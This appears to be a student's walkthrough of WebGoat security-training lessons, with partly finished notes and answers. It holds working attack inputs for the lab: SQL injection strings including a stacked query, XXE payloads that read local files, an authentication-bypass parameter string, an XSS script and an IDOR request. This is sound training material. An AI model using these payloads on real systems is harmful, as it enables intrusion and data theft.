# WebGoat
## Francesco Mauri
---
## Introduction [x]
### WebGoat [x]
* Read
### WebWolf [x]
* Install Webwolf, send email, write code from mail.
* Reset password, go to Webwolf get code
## General [x]
### Http basics [x]
* write something
* intercept HTTP, get header and read the answer
### Http Proxies [x]
* Intercept package, modify it to suite the task, make sure to modify properly the POST
```
/WebGoat/HttpProxies/intercept-request?changeMe=Requests%20are%20tampered%20easily HTTP/1.1
```
---
## Injection Flaws [ ]
### SQL Injeciton [x]
```SQL
smith' or '1' = '1
```
```SQL
1 or true
```
### SQL Injection advanced [ ]
```SQL
asd' or true; select * from user_system_data; --
```
```SQL
work in progress
```
### SQL Injeciton mitigation
```SQL
1' or true order by (case when (hostname = 'webgoat-prd') hostname else status;
```
* Solution: 192.168.4.0
### XXE
#### 3
```XML
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///" >]>
<comment>
  <text>aa&xxe;</text>
</comment>
```
#### 4
* Specify content type to be xml
```XML
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///" >]>
<comment>
  <text>aa&xxe;</text>
</comment>
```
#### 7
```XML
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:////home/USER/.webgoat/XXE/secret.txt" >]>
<comment>
  <text>a&xxe;</text>
</comment>
```
---
## Authentication Flaws [x]
### Authentication Bypass [x]
```js
(secQuestion0=aORtrue)&(secQuestion1=aORtrue)&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746
```
### JWT tokens (Under development) [x]
* In development, therefore passed by default
---
## Coss-Site Scripting (XSS) [ ]
### Cross Site Scripting
#### 3
* YES
#### 7
* Credit card number field
```jss
<script>alert('my javascript here')</script>
```
#### 10
* 2 ways - start.mvc#test/
  * go to lesson java file and check if condition
  * go to GoatRoute.js and find the solution
#### 11
* url + <script>webgoat.customjs.phoneHome()
## Access Control Flaws [ ]
### Insecure Direct Object References
#### 2
* tom cat
#### 3
* Intercept http request
```json
{
  "role": 3,
  "color": "yellow",
  "size": "small",
  "name": "Tom Cat",
  "userId": "2342384"
}
```
* Missing fields are `role` and `userId`
#### 4
* Intercept HTTP, path to profile `WebGoat/IDOR/profile/2342384`
### Missing Function Level Access Control
#### 2
* Enough to access the console and analyse the html page and check for links or other important info that are just commented out. Like the Admin panel.
#### 3
*
## Insecure Communication
### Insecure Login
* Intercept the login and use the intercepted credential to sign-in
## Request Forgeries
### Cross-Site Request Forgeries
*
## Vulnerable Components - A9
### Vulnerable Components
* It is enough to delete the content ```<contact></contact>```
## Client side
* To solve all this tasks it is enough to search in the html the needed fields and modify them
### Client side filtering
### Bypass front-end restriction
### HTML tampering
## Challenges
### WebGoat Challenge
### Admin lost password
### Get it for free
### Photo comments
### Voting
### Without password
### Creating a new account
### Admin Password
### Without account
### Changing password
